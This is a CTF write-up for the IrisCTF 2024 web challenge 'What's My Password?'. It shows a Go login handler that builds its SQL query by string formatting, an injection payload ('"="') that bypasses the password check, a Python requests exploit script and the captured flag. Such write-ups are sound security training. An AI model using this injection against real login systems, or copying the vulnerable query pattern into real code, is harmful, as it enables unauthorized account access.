# IrisCTF 2024


### CTFtime: https://ctftime.org/event/2085/
### Official URL: https://2024.irisc.tf/challenges?category=Web+Exploitation

## 1. What's My Password?

### setup.sql
```sql
CREATE DATABASE uwu;
use uwu;

CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");

CREATE USER 'readonly_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON uwu.users TO 'readonly_user'@'%';
FLUSH PRIVILEGES;

```
`skat` 계정의 패스워드를 탈취하면 플래그를 획득할 수 있다.

## main.go 
```go
qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
query, err := DB.Query(qstring)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Println(err)
			return
		}
		defer query.Close()
```
위 쿼리문에서 SQL Injection 취약점이 존재하여 `{"username": "skat", "password": "\"=\""}` 입력을 통해 쿼리를 조작하여 `skat` 패스워드를 알아낼 수 있다. 

## Exploit Code
```python
import requests

url = "https://whats-my-password-web.chal.irisc.tf"
r = requests.post(f"{url}/api/login", json={"username": "skat", "password": "\"=\""})

print(r.text)
```

### `irisctf{my_p422W0RD_1S_SQl1}`